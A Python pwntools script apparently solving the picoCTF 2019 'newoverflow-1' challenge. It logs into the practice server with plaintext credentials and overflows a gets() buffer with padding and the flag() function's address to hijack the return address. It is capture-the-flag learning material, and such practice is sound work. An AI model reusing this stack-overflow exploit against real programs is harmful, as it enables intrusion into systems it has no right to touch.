from pwn import *
s=ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard")
s.set_working_directory(wd=b"/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a")
p = s.process("./vuln")

# 1 find the padding between the start of the buf and the return address in stack.
# I increase my input string by 8 bytes each time until I get a segmentation fault, and the length of that input string will then be the padding
padding = b"AAAAAAAA" * 9

# 2 find the address of the flag function
# http://docs.pwntools.com/en/latest/elf/elf.html?highlight=elf
e = ELF('./vuln_task4')
flag_address = p64(e.symbols['flag']) # https://docs.pwntools.com/en/stable/util/packing.html

# 3 exploit the gets() function to overflow and override the return address of vuln() to the address of flag()
p.sendlineafter("Welcome to 64-bit. Give me a string that gets you the flag: \n",
                padding+flag_address)
print(p.recvline())
flag = p.recv().decode("utf-8")
flag = flag.split("{")[1].split("}")[0]
print(flag)